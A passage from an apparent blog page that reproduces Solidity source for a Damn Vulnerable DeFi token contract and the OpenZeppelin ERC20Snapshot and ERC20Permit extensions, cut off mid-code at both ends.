pure returns (Bytes32Slot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) &#123;</span><br><span class="line">        <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">        assembly &#123;</span><br><span class="line">            r.slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DamnValuableTokenSnapshot-sol"><a href="#DamnValuableTokenSnapshot-sol" class="headerlink" title="DamnValuableTokenSnapshot.sol"></a>DamnValuableTokenSnapshot.sol</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @title DamnValuableTokenSnapshot</span></span><br><span class="line"><span class="comment"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract DamnValuableTokenSnapshot is ERC20Snapshot &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 private lastSnapshotId;</span><br><span class="line"></span><br><span class="line">    constructor(uint256 initialSupply) ERC20(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">snapshot</span><span class="params">()</span> public <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        lastSnapshotId = _snapshot();</span><br><span class="line">        <span class="keyword">return</span> lastSnapshotId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getBalanceAtLastSnapshot</span><span class="params">(address account)</span> external view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> balanceOfAt(account, lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">getTotalSupplyAtLastSnapshot</span><span class="params">()</span> external view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> totalSupplyAt(lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ERC20Snapshot-sol"><a href="#ERC20Snapshot-sol" class="headerlink" title="ERC20Snapshot.sol"></a>ERC20Snapshot.sol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/extensions/ERC20Snapshot.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../ERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Arrays.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev This contract extends an ERC20 token with a snapshot mechanism. When a snapshot is created, the balances and</span></span><br><span class="line"><span class="comment"> * total supply at the time are recorded for later access.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This can be used to safely create mechanisms based on token balances such as trustless dividends or weighted voting.</span></span><br><span class="line"><span class="comment"> * In naive implementations it&#x27;s possible to perform a &quot;double spend&quot; attack by reusing the same balance from different</span></span><br><span class="line"><span class="comment"> * accounts. By using snapshots to calculate dividends or voting power, those attacks no longer apply. It can also be</span></span><br><span class="line"><span class="comment"> * used to create an efficient ERC20 forking mechanism.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Snapshots are created by the internal &#123;_snapshot&#125; function, which will emit the &#123;Snapshot&#125; event and return a</span></span><br><span class="line"><span class="comment"> * snapshot id. To get the total supply at the time of a snapshot, call the function &#123;totalSupplyAt&#125; with the snapshot</span></span><br><span class="line"><span class="comment"> * id. To get the balance of an account at the time of a snapshot, call the &#123;balanceOfAt&#125; function with the snapshot id</span></span><br><span class="line"><span class="comment"> * and the account address.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> Snapshot policy can be customized by overriding the &#123;_getCurrentSnapshotId&#125; method. For example, having it</span></span><br><span class="line"><span class="comment"> * return `block.number` will trigger the creation of snapshot at the beginning of each new block. When overriding this</span></span><br><span class="line"><span class="comment"> * function, be careful about the monotonicity of its result. Non-monotonic snapshot ids will break the contract.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Implementing snapshots for every block using this method will incur significant gas costs. For a gas-efficient</span></span><br><span class="line"><span class="comment"> * alternative consider &#123;ERC20Votes&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ==== Gas Costs</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Snapshots are efficient. Snapshot creation is _O(1)_. Retrieval of balances or total supply from a snapshot is _O(log</span></span><br><span class="line"><span class="comment"> * n)_ in the number of snapshots that have been created, although _n_ for a specific account will generally be much</span></span><br><span class="line"><span class="comment"> * smaller since identical balances in subsequent snapshots are stored as a single entry.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There is a constant overhead for normal ERC20 transfers due to the additional snapshot bookkeeping. This overhead is</span></span><br><span class="line"><span class="comment"> * only significant for the first transfer that immediately follows a snapshot for a particular account. Subsequent</span></span><br><span class="line"><span class="comment"> * transfers will have normal cost until the next snapshot, and so on.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">abstract contract ERC20Snapshot is ERC20 &#123;</span><br><span class="line">    <span class="comment">// Inspired by Jordi Baylina&#x27;s MiniMeToken to record historical balances:</span></span><br><span class="line">    <span class="comment">// https://github.com/Giveth/minime/blob/ea04d950eea153a04c51fa510b068b9dded390cb/contracts/MiniMeToken.sol</span></span><br><span class="line"></span><br><span class="line">    using Arrays <span class="keyword">for</span> uint256[];</span><br><span class="line">    using Counters <span class="keyword">for</span> Counters.Counter;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Snapshotted values have arrays of ids and the value corresponding to that id. These could be an array of a</span></span><br><span class="line">    <span class="comment">// Snapshot struct, but that would impede usage of functions that work on an array.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Snapshots</span> &#123;</span></span><br><span class="line">        uint256[] ids;</span><br><span class="line">        uint256[] values;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Snapshots) private _accountBalanceSnapshots;</span><br><span class="line">    Snapshots private _totalSupplySnapshots;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Snapshot ids increase monotonically, with the first value being 1. An id of 0 is invalid.</span></span><br><span class="line">    Counters.Counter private _currentSnapshotId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Emitted by &#123;_snapshot&#125; when a snapshot identified by `id` is created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    event <span class="title function_">Snapshot</span><span class="params">(uint256 id)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Creates a new snapshot and returns its snapshot id.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Emits a &#123;Snapshot&#125; event that contains the same id.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &#123;_snapshot&#125; is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a</span></span><br><span class="line"><span class="comment">     * set of accounts, for example using &#123;AccessControl&#125;, or it may be open to the public.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * [WARNING]</span></span><br><span class="line"><span class="comment">     * ====</span></span><br><span class="line"><span class="comment">     * While an open way of calling &#123;_snapshot&#125; is required for certain trust minimization mechanisms such as forking,</span></span><br><span class="line"><span class="comment">     * you must consider that it can potentially be used by attackers in two ways.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow</span></span><br><span class="line"><span class="comment">     * logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target</span></span><br><span class="line"><span class="comment">     * specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs</span></span><br><span class="line"><span class="comment">     * section above.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * We haven&#x27;t measured the actual numbers; if this is something you&#x27;re interested in please reach out to us.</span></span><br><span class="line"><span class="comment">     * ====</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _snapshot() internal virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        _currentSnapshotId.increment();</span><br><span class="line"></span><br><span class="line">        uint256 currentId = _getCurrentSnapshotId();</span><br><span class="line">        emit <span class="title function_">Snapshot</span><span class="params">(currentId)</span>;</span><br><span class="line">        <span class="keyword">return</span> currentId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Get the current snapshotId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _getCurrentSnapshotId() internal view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _currentSnapshotId.current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Retrieves the balance of `account` at the time `snapshotId` was created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">balanceOfAt</span><span class="params">(address account, uint256 snapshotId)</span> public view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> snapshotted, uint256 value) = _valueAt(snapshotId, _accountBalanceSnapshots[account]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> snapshotted ? value : balanceOf(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Retrieves the total supply at the time `snapshotId` was created.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">totalSupplyAt</span><span class="params">(uint256 snapshotId)</span> public view virtual <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        (<span class="type">bool</span> snapshotted, uint256 value) = _valueAt(snapshotId, _totalSupplySnapshots);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> snapshotted ? value : totalSupply();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update balance and/or total supply snapshots before the values are modified. This is implemented</span></span><br><span class="line">    <span class="comment">// in the _beforeTokenTransfer hook, which is executed for _mint, _burn, and _transfer operations.</span></span><br><span class="line">    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override &#123;</span><br><span class="line">        super._beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// mint</span></span><br><span class="line">            _updateAccountSnapshot(to);</span><br><span class="line">            _updateTotalSupplySnapshot();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (to == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">// burn</span></span><br><span class="line">            _updateAccountSnapshot(from);</span><br><span class="line">            _updateTotalSupplySnapshot();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// transfer</span></span><br><span class="line">            _updateAccountSnapshot(from);</span><br><span class="line">            _updateAccountSnapshot(to);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>, uint256)</span> &#123;</span><br><span class="line">        require(snapshotId &gt; <span class="number">0</span>, <span class="string">&quot;ERC20Snapshot: id is 0&quot;</span>);</span><br><span class="line">        require(snapshotId &lt;= _getCurrentSnapshotId(), <span class="string">&quot;ERC20Snapshot: nonexistent id&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// When a valid snapshot is queried, there are three possibilities:</span></span><br><span class="line">        <span class="comment">//  a) The queried value was not modified after the snapshot was taken. Therefore, a snapshot entry was never</span></span><br><span class="line">        <span class="comment">//  created for this id, and all stored snapshot ids are smaller than the requested one. The value that corresponds</span></span><br><span class="line">        <span class="comment">//  to this id is the current one.</span></span><br><span class="line">        <span class="comment">//  b) The queried value was modified after the snapshot was taken. Therefore, there will be an entry with the</span></span><br><span class="line">        <span class="comment">//  requested id, and its value is the one to return.</span></span><br><span class="line">        <span class="comment">//  c) More snapshots were created after the requested one, and the queried value was later modified. There will be</span></span><br><span class="line">        <span class="comment">//  no entry for the requested id: the value that corresponds to it is that of the smallest snapshot id that is</span></span><br><span class="line">        <span class="comment">//  larger than the requested one.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// In summary, we need to find an element in an array, returning the index of the smallest value that is larger if</span></span><br><span class="line">        <span class="comment">// it is not found, unless said value doesn&#x27;t exist (e.g. when all values are smaller). Arrays.findUpperBound does</span></span><br><span class="line">        <span class="comment">// exactly this.</span></span><br><span class="line"></span><br><span class="line">        uint256 index = snapshots.ids.findUpperBound(snapshotId);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (index == snapshots.ids.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">false</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">true</span>, snapshots.values[index]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateAccountSnapshot(address account) private &#123;</span><br><span class="line">        _updateSnapshot(_accountBalanceSnapshots[account], balanceOf(account));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateTotalSupplySnapshot() private &#123;</span><br><span class="line">        _updateSnapshot(_totalSupplySnapshots, totalSupply());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _updateSnapshot(Snapshots storage snapshots, uint256 currentValue) private &#123;</span><br><span class="line">        uint256 currentId = _getCurrentSnapshotId();</span><br><span class="line">        <span class="keyword">if</span> (_lastSnapshotId(snapshots.ids) &lt; currentId) &#123;</span><br><span class="line">            snapshots.ids.push(currentId);</span><br><span class="line">            snapshots.values.push(currentValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _lastSnapshotId(uint256[] storage ids) private view <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ids.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ids[ids.length - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ERC20Permit-sol-签名"><a href="#ERC20Permit-sol-签名" class="headerlink" title="ERC20Permit.sol(签名)"></a>ERC20Permit.sol(签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/extensions/ERC20Permit.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;./IERC20Permit.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../ERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/cryptography/ECDSA.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/cryptography/EIP712.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;../../../utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Implementation of the ERC20 Permit extension allowing approvals to be made via signatures, as defined in</span></span><br><span class="line"><span class="comment"> * https://eips.ethereum.org/EIPS/eip-2612[EIP-2612].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Adds the &#123;permit&#125; method, which can be used to change an account&#x27;s ERC20 allowance (see &#123;IERC20-allowance&#125;) by</span></span><br><span class="line"><span class="comment"> * presenting a message signed by the account. By not relying on `&#123;IERC20-approve&#125;`, the token holder account doesn&#x27;t</span></span><br><span class="line"><span class="comment"> * need to send a transaction, and thus is not required to hold Ether at all.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v3.4._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">abstract contract ERC20Permit is ERC20, IERC20Permit, EIP712 &#123;</span><br><span class="line">    using Counters <span class="keyword">for</span> Counters.Counter;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; Counters.Counter) private _nonces;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// solhint-disable-next-line var-name-mixedcase</span></span><br><span class="line">    bytes32 private constant _PERMIT_TYPEHASH =</span><br><span class="line">        keccak256(<span class="string">&quot;Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)&quot;</span>);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev In previous versions `_PERMIT_TYPEHASH` was declared as `immutable`.</span></span><br><span class="line"><span class="comment">     * However, to ensure consistency with the upgradeable transpiler, we will continue</span></span><br><span class="line"><span class="comment">     * to reserve a slot.</span></span><br><span class="line"><span class="comment">     * @custom:oz-renamed-from _PERMIT_TYPEHASH</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// solhint-disable-next-line var-name-mixedcase</span></span><br><span class="line">    bytes32 private _PERMIT_TYPEHASH_DEPRECATED_SLOT;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Initializes the &#123;EIP712&#125; domain separator using the `name` parameter, and setting `version` to `&quot;1&quot;`.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * It&#x27;s a good idea to use the same `name` that is defined as the ERC20 token name.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory name) EIP712(name, <span class="string">&quot;1&quot;</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-permit&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">permit</span><span class="params">(</span></span><br><span class="line"><span class="params">        address owner,</span></span><br><span class="line"><span class="params">        address spender,</span></span><br><span class="line"><span class="params">        uint256 value,</span></span><br><span class="line"><span class="params">        uint256 deadline,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> public virtual override &#123;</span><br><span class="line">        require(block.timestamp &lt;= deadline, <span class="string">&quot;ERC20Permit: expired deadline&quot;</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 structHash = keccak256(abi.encode(_PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));</span><br><span class="line"></span><br><span class="line">        bytes32 hash = _hashTypedDataV4(structHash);</span><br><span class="line"></span><br><span class="line">        address signer = ECDSA.recover(hash, v, r, s);</span><br><span class="line">        require(signer == owner, <span class="string">&quot;ERC20Permit: invalid signature&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _approve(owner, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-nonces&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">nonces</span><span class="params">(address owner)</span> public view virtual override <span class="title function_">returns</span> <span class="params">(uint256)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _nonces[owner].current();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev See &#123;IERC20Permit-DOMAIN_SEPARATOR&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// solhint-disable-next-line func-name-mixedcase</span></span><br><span class="line">    function <span class="title function_">DOMAIN_SEPARATOR</span><span class="params">()</span> external view override <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> _domainSeparatorV4();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev &quot;Consume a nonce&quot;: return the current value and increment.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.1._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _useNonce(address owner) internal virtual <span class="title function_">returns</span> <span class="params">(uint256 current)</span> &#123;</span><br><span class="line">        Counters.Counter storage nonce = _nonces[owner];</span><br><span class="line">        current = nonce.current();</span><br><span class="line">        nonce.increment();</span><br><span class="line">    &#125;</span><br><span 